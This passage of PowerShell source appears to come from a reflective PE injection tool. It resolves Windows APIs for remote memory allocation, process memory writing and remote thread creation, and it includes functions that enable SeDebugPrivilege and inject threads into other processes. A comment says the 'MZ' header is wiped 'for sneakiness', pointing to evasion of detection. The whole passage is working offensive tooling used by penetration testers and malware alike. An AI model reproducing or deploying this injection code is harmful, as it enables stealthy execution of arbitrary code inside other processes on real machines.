		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
